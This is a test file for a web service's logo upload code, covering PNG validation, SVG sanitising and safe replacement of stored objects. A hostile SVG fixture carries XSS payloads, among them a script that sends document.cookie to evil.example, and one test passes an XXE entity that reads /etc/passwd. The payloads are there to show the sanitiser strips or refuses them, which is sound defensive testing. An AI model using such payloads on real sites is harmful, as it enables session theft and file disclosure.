// A protected identity's logo (D05 T01 §1): PNG read chunk by chunk, SVG rebuilt from an allowlist, the claimed type
// matching the bytes, and replacement that never leaves the identity pointing at a missing object, whatever fails.
import { env } from "cloudflare:test";
import { beforeEach, describe, expect, it } from "vitest";
import { getIdentity, IdentityRefused, setIdentity } from "../../src/trust/identity";
import { MAX_LOGO_BYTES, pngProblem, removeLogo, sanitiseSvg, storeLogo } from "../../src/trust/logo";
import { events, protectableOrg } from "./helpers";

const db = env.DB;
const bucket = env.ARTEFACTS;

// A PNG of the given size: IHDR, one IDAT of zlib-compressed grey rows, IEND, every CRC computed.
const crcTable = Array.from({ length: 256 }, (_, n) => {
  let c = n;
  for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
  return c >>> 0;
});
const crc = (bytes: Uint8Array) => {
  let c = 0xffffffff;
  for (const b of bytes) c = (crcTable[(c ^ b) & 0xff] as number) ^ (c >>> 8);
  return (c ^ 0xffffffff) >>> 0;
};
const be32 = (n: number) => [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255];
const chunk = (type: string, data: Uint8Array) => {
  const typed = Uint8Array.from([...type].map((c) => c.charCodeAt(0)).concat([...data]));
  return [...be32(data.length), ...typed, ...be32(crc(typed))];
};
async function png(width: number, height: number): Promise<Uint8Array> {
  const rows = new Uint8Array(Math.min(height, 4) * (Math.min(width, 4) + 1));
  const stream = new Blob([rows]).stream().pipeThrough(new CompressionStream("deflate"));
  const idat = new Uint8Array(await new Response(stream).arrayBuffer());
  const ihdr = Uint8Array.from([...be32(width), ...be32(height), 8, 0, 0, 0, 0]);
  return Uint8Array.from([
    0x89,
    0x50,
    0x4e,
    0x47,
    0x0d,
    0x0a,
    0x1a,
    0x0a,
    ...chunk("IHDR", ihdr),
    ...chunk("IDAT", idat),
    ...chunk("IEND", new Uint8Array()),
  ]);
}

const HOSTILE = `<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 100 40" onload="alert(1)">
  <script>fetch('https://evil.example/'+document.cookie)</script>
  <foreignObject width="10" height="10"><div xmlns="http://www.w3.org/1999/xhtml">x</div></foreignObject>
  <image href="https://evil.example/track.png" width="1" height="1"/>
  <a xlink:href="javascript:alert(2)"><rect width="5" height="5"/></a>
  <path d="M0 0 L100 0 L100 40 Z" fill="#FF4A14" style="fill: url(https://evil.example/x)"/>
  <circle cx="20" cy="20" r="10" fill="url(#g)" onclick="alert(3)"/>
  <text x="30" y="30" font-family="Exo">Hadeda</text>
</svg>`;

const svgBytes = (s: string) => new TextEncoder().encode(s);
const object = async (key: string) => (await bucket.get(key))?.text();

async function orgWithIdentity() {
  const orgId = await protectableOrg(
    `h${crypto.randomUUID().slice(0, 8)}.example`,
    `a${crypto.randomUUID().slice(0, 8)}@x.example`,
  );
  await setIdentity(db, orgId, "owner", { displayNames: ["Hadeda"], financeContact: null, protected: false });
  return orgId;
}

beforeEach(async () => {
  await db.batch(
    ["trust_events", "identities", "org_domains", "org_addresses"].map((t) => db.prepare(`DELETE FROM ${t}`)),
  );
});

describe("validation", () => {
  it("accepts whole PNGs and refuses truncated, damaged, oversized and empty ones", async () => {
    expect(pngProblem(await png(64, 32))).toBeNull();
    expect(pngProblem(await png(4096, 4096))).toBeNull();
    const good = await png(64, 32);
    expect(pngProblem(good.subarray(0, good.length - 6))).toMatch(/cut short/);
    const bad = Uint8Array.from(good);
    bad[29] = (bad[29] as number) ^ 1; // inside IHDR's CRC
    expect(pngProblem(bad)).toMatch(/damaged/);
    expect(pngProblem(await png(4097, 10))).toMatch(/larger than 4096/);
    expect(pngProblem(await png(10, 4097))).toMatch(/larger than 4096/);
  });

  it("rebuilds a hostile SVG without its script, handlers, external image or styled URL, keeping its artwork", () => {
    const clean = sanitiseSvg(HOSTILE);
    for (const gone of ["script", "foreignObject", "onload", "onclick", "evil.example", "javascript:", "<image", "<a "])
      expect(clean).not.toContain(gone);
    expect(clean).toContain('<path d="M0 0 L100 0 L100 40 Z" fill="#FF4A14"/>');
    expect(clean).toContain('<circle cx="20" cy="20" r="10" fill="url(#g)"/>');
    expect(clean).toContain(">Hadeda</text>");
    expect(clean.startsWith('<svg xmlns="http://www.w3.org/2000/svg"')).toBe(true);
  });

  it("refuses an SVG with nothing left to draw, a document type, or broken nesting", () => {
    expect(() => sanitiseSvg("<svg><script>alert(1)</script></svg>")).toThrow(/nothing to draw/);
    expect(() =>
      sanitiseSvg('<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg><path d="M0 0"/></svg>'),
    ).toThrow(/document type/);
    expect(() => sanitiseSvg("<svg><g><path d='M0 0'/></svg>")).toThrow(/well formed/);
    expect(() => sanitiseSvg("<html><path d='M0 0'/></html>")).toThrow(/not an SVG/);
  });
});

describe("storeLogo and removeLogo", () => {
  it("stores a PNG and an SVG under fresh keys, replacing and deleting the previous one, with events", async () => {
    const orgId = await orgWithIdentity();
    const first = await storeLogo(bucket, db, orgId, "owner", await png(64, 32), "image/png");
    expect(first.key).toMatch(new RegExp(`^ident/${orgId}/logo-[0-9A-Z]{26}\\.png$`));
    expect((await getIdentity(db, orgId))?.logo).toEqual(first);
    const second = await storeLogo(bucket, db, orgId, "owner", svgBytes(HOSTILE), "image/svg+xml");
    expect(await bucket.get(first.key)).toBeNull();
    expect(await object(second.key)).not.toContain("script");
    expect((await getIdentity(db, orgId))?.logo).toEqual(second);
    await removeLogo(bucket, db, orgId, "owner");
    expect((await getIdentity(db, orgId))?.logo).toBeNull();
    expect(await bucket.get(second.key)).toBeNull();
    expect((await events(orgId)).map((e) => e.kind)).toEqual([
      "identity.set",
      "identity.logo_stored",
      "identity.logo_stored",
      "identity.logo_removed",
    ]);
  });

  it("refuses an oversized file, a mistyped one and a GIF, keeping the previous logo", async () => {
    const orgId = await orgWithIdentity();
    const kept = await storeLogo(bucket, db, orgId, "owner", await png(8, 8), "image/png");
    const gif = Uint8Array.from([0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 1, 0, 1, 0]);
    const tries: [Uint8Array, string, RegExp][] = [
      [new Uint8Array(MAX_LOGO_BYTES + 1), "image/png", /larger than 2 MiB/],
      [gif, "image/png", /PNG or SVG/],
      [await png(8, 8), "image/svg+xml", /not the type it says/],
      [svgBytes('<svg><path d="M0 0"/></svg>'), "image/png", /not the type it says/],
      [await png(4097, 8), "image/png", /larger than 4096/],
    ];
    for (const [bytes, type, message] of tries) {
      const p = storeLogo(bucket, db, orgId, "owner", bytes, type);
      await expect(p).rejects.toBeInstanceOf(IdentityRefused);
      await expect(p).rejects.toThrow(message);
    }
    expect((await getIdentity(db, orgId))?.logo).toEqual(kept);
    expect(await bucket.get(kept.key)).not.toBeNull();
  });

  it("keeps the previous logo when the new object cannot be written", async () => {
    const orgId = await orgWithIdentity();
    const kept = await storeLogo(bucket, db, orgId, "owner", await png(8, 8), "image/png");
    const failing = new Proxy(bucket, {
      get: (t, p) => (p === "put" ? () => Promise.reject(new Error("R2 down")) : Reflect.get(t, p).bind(t)),
    });
    await expect(storeLogo(failing, db, orgId, "owner", await png(9, 9), "image/png")).rejects.toThrow(/R2 down/);
    expect((await getIdentity(db, orgId))?.logo).toEqual(kept);
  });

  it("deletes the new object and keeps the old when the database write fails", async () => {
    const orgId = await orgWithIdentity();
    const kept = await storeLogo(bucket, db, orgId, "owner", await png(8, 8), "image/png");
    await db.exec("CREATE TRIGGER fail_logo BEFORE INSERT ON trust_events BEGIN SELECT RAISE(ABORT, 'db down'); END");
    try {
      await expect(storeLogo(bucket, db, orgId, "owner", await png(9, 9), "image/png")).rejects.toThrow(/db down/);
    } finally {
      await db.exec("DROP TRIGGER fail_logo");
    }
    expect((await getIdentity(db, orgId))?.logo).toEqual(kept);
    expect(await bucket.get(kept.key)).not.toBeNull();
    const listed = await bucket.list({ prefix: `ident/${orgId}/` });
    expect(listed.objects.map((o) => o.key)).toEqual([kept.key]);
  });

  it("lets the first of two uploads win and removes the loser's object", async () => {
    const orgId = await orgWithIdentity();
    // The loser read the identity before the winner committed: simulate by committing a logo between its read and its
    // write, through a bucket whose put first stores the winner.
    let winner: string | null = null;
    const racing = new Proxy(bucket, {
      get: (t, p) =>
        p === "put"
          ? async (key: string, body: Uint8Array, opts: R2PutOptions) => {
              const w = await storeLogo(bucket, db, orgId, "other", await png(7, 7), "image/png");
              winner = w.key;
              return t.put(key, body, opts);
            }
          : Reflect.get(t, p).bind(t),
    });
    await expect(storeLogo(racing, db, orgId, "owner", await png(9, 9), "image/png")).rejects.toThrow(
      /changed meanwhile/,
    );
    expect((await getIdentity(db, orgId))?.logo?.key).toBe(winner);
    const listed = await bucket.list({ prefix: `ident/${orgId}/` });
    expect(listed.objects.map((o) => o.key)).toEqual([winner]);
  });

  it("names the orphan when the replaced object cannot be deleted", async () => {
    const orgId = await orgWithIdentity();
    const old = await storeLogo(bucket, db, orgId, "owner", await png(8, 8), "image/png");
    const stuck = new Proxy(bucket, {
      get: (t, p) => (p === "delete" ? () => Promise.reject(new Error("R2 delete down")) : Reflect.get(t, p).bind(t)),
    });
    const next = await storeLogo(stuck, db, orgId, "owner", await png(9, 9), "image/png");
    expect((await getIdentity(db, orgId))?.logo).toEqual(next);
    const last = (await events(orgId)).at(-1);
    expect(last).toMatchObject({ kind: "identity.logo_stored", detail: { replaced: old.key, orphan: old.key } });
  });

  it("refuses a logo before the identity exists", async () => {
    const orgId = await protectableOrg("pre.example", "p@pre.example");
    await expect(storeLogo(bucket, db, orgId, "owner", await png(8, 8), "image/png")).rejects.toThrow(
      /identity before its logo/,
    );
  });
});
